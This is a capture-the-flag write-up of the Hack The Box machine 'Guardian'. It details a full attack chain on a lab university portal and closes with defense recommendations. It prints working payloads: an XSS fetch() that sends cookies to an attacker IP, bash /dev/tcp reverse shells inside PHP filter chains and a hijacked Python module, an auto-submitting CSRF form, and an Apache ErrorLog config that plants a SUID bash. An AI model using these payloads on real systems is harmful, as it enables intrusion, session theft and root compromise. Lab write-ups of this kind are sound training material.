# HTB - Guardian - 10.129.94.222

## HTB - Guardian

### Machine Info

* **Difficulty:** Medium
* **OS:** Linux (Ubuntu)
* **IP:** 10.129.94.222
* **Key Skills:** Web enumeration, IDOR, XSS cookie stealing, CSRF, LFI to RCE, Python library hijacking, Apache misconfiguration

### Overview

Guardian is a Linux box hosting a university portal system with multiple subdomains. The initial foothold involves exploiting an IDOR vulnerability to access admin messages, leading to credential discovery. From there, we chain together an XSS attack via malicious XLSX upload to steal cookies, escalate to a lecturer account, and abuse CSRF to create an admin user. The admin panel has an LFI vulnerability that we exploit using PHP filter chains for RCE. Privilege escalation involves MySQL credential reuse, password cracking, Python library hijacking, and finally exploiting Apache configuration permissions.

**Key Concepts:**

* IDOR (Insecure Direct Object Reference)
* XSS via PHPSpreadsheet vulnerability
* CSRF token pool exploitation
* LFI to RCE via PHP filter chains
* Python import hijacking
* Apache ErrorLog code execution

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap scan reveals SSH (22) and HTTP (80) ├─ Discover subdomains: portal.guardian.htb, gitea.guardian.htb └─ Find default credentials and email patterns
2. **Foothold via IDOR & XSS** ├─ Access student portal with default creds ├─ Exploit IDOR to read admin chat messages ├─ Discover Gitea credentials in chat ├─ Generate malicious XLSX with XSS payload └─ Steal lecturer session cookie
3. **Privilege Escalation to Admin** ├─ Access lecturer account via stolen cookie ├─ Exploit CSRF token pool vulnerability ├─ Create malicious notice with form injection └─ Force admin to create new admin account
4. **Remote Code Execution** ├─ Discover LFI in admin reports panel ├─ Bypass filters with PHP filter chains ├─ Generate RCE payload using php\_filter\_chain\_generator └─ Execute reverse shell as www-data
5. **Lateral Movement & Root** ├─ Extract MySQL credentials from config files ├─ Crack password hashes with hashcat ├─ SSH as jamil user ├─ Hijack Python status module for mark shell ├─ Exploit Apache ErrorLog directive └─ Gain root access via SUID bash

***

### Initial Enumeration

#### Port Scanning

Let's see what's running on this box:

```bash
nmap -Pn -sCV -T5 10.129.94.222 -oN nmap.tcp
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache/2.4.52 (Ubuntu)
```

**What we learned:**

* Standard SSH and web server setup
* Apache running on Ubuntu
* Hostname hint: `_default_` suggests virtual hosts

#### Web Enumeration

**Main site:** `http://guardian.htb`

Directory bruteforce didn't find much, but we discovered some interesting email addresses in the page source:

```
GU0142023@guardian.htb
GU6262023@guardian.htb
GU0702025@guardian.htb
```

These follow a pattern: `GU` + number + year format. Looks like student IDs.

**Finding subdomains:**

Through various enumeration (checking comments, links, etc.), we found:

* `http://portal.guardian.htb` - Student/staff portal
* `http://gitea.guardian.htb` - Git repository hosting

**Pro tip:** Always add discovered domains to `/etc/hosts`:

```bash
echo "10.129.94.222 guardian.htb portal.guardian.htb gitea.guardian.htb" | sudo tee -a /etc/hosts
```

***

### Foothold - IDOR to Credentials

#### Default Credentials

Looking at the student portal login page, we noticed a comment in the source code hinting at default credentials. Testing the pattern:

```
Username: GU0142023
Password: GU1234
```

**Boom!** We're in as a student.

#### IDOR Vulnerability

The chat feature caught our attention. Messages are accessed via URL like:

```
http://portal.guardian.htb/student/chat.php?chat_id=1
```

**What's IDOR?** When an application uses predictable identifiers (like sequential numbers) without checking if you're authorized to access them.

**Testing it:**

Just changed the `chat_id` parameter manually:

```
chat_id=1  → Our chat
chat_id=2  → Admin chat (jackpot!)
chat_id=3  → Another user's chat
```

**In chat\_id=2, we found:**

A message from admin revealing Gitea credentials:

```
User: jamil.enockson
Password: DHsNnk3V503
```

#### Gitea Repository Access

Logged into `http://gitea.guardian.htb` with `jamil.enockson:DHsNnk3V503`

**Found the portal source code!** This gave us:

**Database credentials** (`config.php`):

```php
'username' => 'root',
'password' => 'Gu4rd14n_un1_1s_th3_b3st',
'salt' => '8Sb)tM1vs1SS'
```

**Important files discovered:**

* `submission.php` - Handles file uploads (accepts .docx and .xlsx)
* `composer.json` - Shows PHPSpreadsheet 3.7.0 in use
* Various admin functions we can't access yet

***

### XSS via PHPSpreadsheet

#### The Vulnerability

PHPSpreadsheet 3.7.0 is vulnerable to **CVE-2025-22131** - XSS via malicious XLSX files.

**How it works:** When the application renders an XLSX file, our JavaScript payload executes in the victim's browser.

#### Generating the Payload

Using the POC from GitHub (s0ck37/CVE-2025-22131-POC):

```bash
python3 generate.py '<script>fetch("http://10.10.16.16/"+document.cookie)</script>'
```

This creates `malicious.xlsx` that will:

1. Execute JavaScript when opened
2. Grab the victim's session cookie
3. Send it to our server

#### Setting Up the Listener

```bash
sudo python3 -m http.server 80
```

#### Uploading the Malicious File

1. Login as student (GU0142023)
2. Navigate to assignments
3. Upload `malicious.xlsx` as assignment submission
4. Wait for lecturer to review...

**Got the cookie!**

```
10.129.94.222 - - "GET /PHPSESSID=2am6r05h3aqlke5lpjskq0verc HTTP/1.1" 404
```

#### Cookie Hijacking

Replace our session cookie with the stolen one:

```bash
# In browser dev tools (F12) → Application → Cookies
# Change PHPSESSID value to: 2am6r05h3aqlke5lpjskq0verc
```

**We're now logged in as sammy.treat (lecturer)!**

***

### CSRF Attack to Admin

#### Understanding the Vulnerability

As a lecturer, we can create notices that the admin reviews. The admin panel has a user creation feature at `/admin/createuser.php`.

**The setup:**

* CSRF tokens exist for protection
* BUT they're stored in a shared token pool
* Any valid token works for any request
* Lecturers can generate tokens too

**Token pool code** (`config/csrf-token.php`):

```php
function is_valid_token($token) {
    $tokens = get_token_pool();
    return in_array($token, $tokens); // Checks if token exists in pool
}
```

#### Grabbing a Valid Token

```bash
curl http://portal.guardian.htb/lecturer/notices/create.php \
  --cookie "PHPSESSID=2am6r05h3aqlke5lpjskq0verc" | grep "csrf_token"
```

**Output:**

```html
<input type="hidden" name="csrf_token" value="134fa0603c0ed761dc6d66f275188eef">
```

#### Creating the Exploit

**File:** `csrf.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Form Exploit</title>
</head>
<body>
    <form method="POST" action="http://portal.guardian.htb/admin/createuser.php" id="exploitForm">
        <input type="hidden" name="csrf_token" value="134fa0603c0ed761dc6d66f275188eef">
        <input type="hidden" name="username" value="fak05">
        <input type="hidden" name="password" value="password@123">
        <input type="hidden" name="full_name" value="Fak User">
        <input type="hidden" name="email" value="fak@guardian.htb">
        <input type="hidden" name="dob" value="2025-09-01">
        <input type="hidden" name="address" value="123 Fake St">
        <input type="hidden" name="user_role" value="admin">
    </form>
    
    <script>
        window.onload = function() {
            document.getElementById('exploitForm').submit();
        };
    </script>
</body>
</html>
```

#### Hosting and Delivering

```bash
# Host the exploit
python3 -m http.server 8000

# Create notice as lecturer with reference link
# Reference Link: http://10.10.16.16:8000/csrf.html
```

When admin reviews the notice and clicks "Reference Link", the form auto-submits and creates our admin account!

**Login as admin:**

```
Username: fak05
Password: password@123
```

**We're admin now!** 🎉

***

### LFI to RCE

#### The Vulnerability

In the admin reports section (`/admin/reports.php`), there's a file inclusion vulnerability:

```php
$report = $_GET['report'] ?? '';

// Weak filters
if (strpos($report, '..') !== false) {
    die("Invalid report path");
}

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("Invalid report type");
}

require $report; // Vulnerable!
```

**Filters to bypass:**

* Can't use `..` for directory traversal
* Must end with one of: `enrollment.php`, `academic.php`, `financial.php`, or `system.php`

#### PHP Filter Chain Exploit

PHP filter chains let us:

1. Read arbitrary files
2. Execute arbitrary PHP code
3. Bypass most LFI restrictions

**The trick:** Use `php://filter` wrapper to encode our payload, then append `, system.php` to satisfy the regex.

#### Generating the Payload

Using `php_filter_chain_generator.py`:

```bash
# Test with simple output
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
```

**For reverse shell:**

```bash
python3 php_filter_chain_generator.py --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.16.16/1234 0>&1'\''");?>'
```

This creates a massive filter chain that decodes to our PHP payload.

#### Exploitation

**Setup listener:**

```bash
nc -lvnp 1234
```

**Send the payload:**

1. Copy the generated filter chain
2. Navigate to: `http://portal.guardian.htb/admin/reports.php`
3. In the report parameter, paste: `[FILTER_CHAIN], system.php`
4. The `, system.php` satisfies the regex
5. The filter chain executes our code first

**Shell received as www-data!**

```bash
www-data@guardian:/var/www/html$
```

***

### Lateral Movement - MySQL to Jamil

#### Extracting Credentials

Remember those DB creds from Gitea? Time to use them:

```bash
mysql --host=localhost --user=root --password=Gu4rd14n_un1_1s_th3_b3st guardiandb
```

**Dump user hashes:**

```sql
SELECT username, password_hash FROM users WHERE user_role IN ('admin', 'lecturer');
```

**Results:**

```
admin:694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6
jamil.enockson:c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250
mark.pargetter:8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e
```

#### Cracking with Hashcat

Remember the salt from config.php: `8Sb)tM1vs1SS`

**Format for hashcat:**

```
username:hash:salt
```

**Crack them:**

```bash
# Mode 1410 = sha256($pass.$salt)
hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt -w 3 -O --username
```

**Cracked passwords:**

```
jamil.enockson:copperhouse56
admin:fakebake000
```

#### SSH Access

```bash
ssh jamil@10.129.94.222
Password: copperhouse56
```

**User flag:**

```bash
cat /home/jamil/user.txt
23ed4eeee45917b39f513d6152d3ca61
```

***

### Lateral Movement - Jamil to Mark

#### Sudo Permissions

```bash
sudo -l
```

**Output:**

```
User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

We can run this Python script as mark!

#### Analyzing the Script

**Main script:** `/opt/scripts/utilities/utilities.py`

```python
#!/usr/bin/env python3
import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status  # Interesting!

def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ])
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            sys.exit(1)
        db.backup_database()
        
    elif args.action == "zip-attachments":
        if user != "mark":
            sys.exit(1)
        attachments.zip_attachments()
        
    elif args.action == "collect-logs":
        if user != "mark":
            sys.exit(1)
        logs.collect_logs()
        
    elif args.action == "system-status":
        status.system_status()  # No user check!
```

**Key points:**

* Most actions require user to be "mark"
* `system-status` has NO user check
* It imports from `utils.status`

#### Python Library Hijacking

**Checking permissions:**

```bash
ls -la /opt/scripts/utilities/utils/
```

**Output:**

```
-rw-rw-r-- 1 mark admins 245 status.py
```

We're in the `admins` group, so we can **write to status.py**!

#### Creating Malicious Module

**Original status.py:**

```python
import platform
import psutil

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
```

**Modified version:**

```python
import platform
import psutil
import subprocess

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    # Add reverse shell
    subprocess.run(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.16/5555 0>&1"])
```

**Steps:**

```bash
# Backup original
cp /opt/scripts/utilities/utils/status.py /tmp/status.py.bak

# Edit the file
nano /opt/scripts/utilities/utils/status.py
# Add the subprocess lines

# Setup listener on attacker machine
nc -lvnp 5555
```

#### Execution

```bash
sudo -u mark /opt/scripts/utilities/utilities.py system-status
```

**Shell received as mark!**

```bash
mark@guardian:/opt/scripts/utilities$
```

***

### Privilege Escalation to Root

#### Sudo Permissions Check

```bash
sudo -l
```

**Output:**

```
User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

We can run `safeapache2ctl` as root without a password!

#### Analyzing safeapache2ctl

This is a wrapper around `apache2ctl` that allows custom config files via `-f` flag.

**The plan:** Use Apache's `ErrorLog` directive to execute commands as root.

#### Apache ErrorLog Exploitation

**How it works:**

* Apache's `ErrorLog` directive can pipe errors to commands
* Using `|/bin/sh -c 'command'` syntax
* When Apache starts, it runs as root
* Our command executes with root privileges

#### Creating Malicious Config

**File:** `/home/mark/confs/root.conf`

```apache
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
ServerRoot "/etc/apache2"
ServerName localhost
PidFile /tmp/apache-rs.pid
Listen 127.0.0.1:8080
ErrorLog "|/bin/sh -c 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash'"
```

**What this does:**

1. Sets up minimal Apache config
2. Uses `ErrorLog` to execute command
3. Copies `/bin/bash` to `/tmp/bash`
4. Sets SUID bit on the copy
5. We can then run `/tmp/bash -p` for root shell

#### Exploitation

```bash
# Create config directory
mkdir -p ~/confs
cd ~/confs

# Create malicious config
nano root.conf
# Paste the config above

# Execute as root
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/root.conf

# Check if SUID bash was created
ls -la /tmp/bash
-rwsr-sr-x 1 root root 1396520 Oct 15 01:00 /tmp/bash

# Execute SUID bash
/tmp/bash -p
```

**Root shell!**

```bash
bash-5.1# whoami
root
```

**Root flag:**

```bash
cat /root/root.txt
317fa3cc5c6f6ccc12f2592f65eb01d1
```

***

### Quick Reference

#### Initial Access

```bash
# Nmap scan
nmap -Pn -sCV -T5 10.129.94.222 -oN nmap.tcp

# Default creds
GU0142023:GU1234

# IDOR exploitation
http://portal.guardian.htb/student/chat.php?chat_id=2

# Generate malicious XLSX
python3 generate.py '<script>fetch("http://ATTACKER_IP/"+document.cookie)</script>'
```

#### CSRF Attack

```bash
# Get CSRF token
curl http://portal.guardian.htb/lecturer/notices/create.php \
  --cookie "PHPSESSID=COOKIE" | grep csrf_token

# Host exploit
python3 -m http.server 8000
```

#### LFI to RCE

```bash
# Generate PHP filter chain
python3 php_filter_chain_generator.py \
  --chain '<?php system("bash -c '\''bash -i >& /dev/tcp/IP/PORT 0>&1'\''");?>'

# Setup listener
nc -lvnp 1234
```

#### Database Access

```bash
# Connect to MySQL
mysql --host=localhost --user=root --password=Gu4rd14n_un1_1s_th3_b3st guardiandb

# Crack hashes
hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt -w 3 -O --username
```

#### Privilege Escalation

```bash
# Python library hijacking
sudo -u mark /opt/scripts/utilities/utilities.py system-status

# Apache ErrorLog exploit
sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/root.conf
/tmp/bash -p
```

***

### Key Takeaways

**What we learned:**

1. **IDOR vulnerabilities** - Always test sequential IDs in URLs, especially in chat/message features
2. **XSS in file uploads** - File parsers (like PHPSpreadsheet) can execute code when rendering uploaded files
3. **CSRF token pools** - Shared token pools defeat the purpose of CSRF protection
4. **PHP filter chains** - Powerful technique to bypass LFI restrictions and achieve RCE
5. **Python import hijacking** - Writable modules in the import path can be exploited for privilege escalation
6. **Apache ErrorLog abuse** - Configuration directives that execute commands are dangerous when controllable

**Defense recommendations:**

* Implement proper authorization checks (not just authentication)
* Validate and sanitize all file uploads
* Use per-request CSRF tokens tied to sessions
* Restrict file inclusion to whitelisted paths
* Limit write permissions on system modules
* Restrict configuration file paths in admin tools

### Related Topics

* \[\[IDOR Vulnerabilities]]
* \[\[XSS Exploitation]]
* \[\[CSRF Attacks]]
* \[\[LFI to RCE]]
* \[\[Python Privilege Escalation]]
* \[\[Apache Configuration Exploitation]]

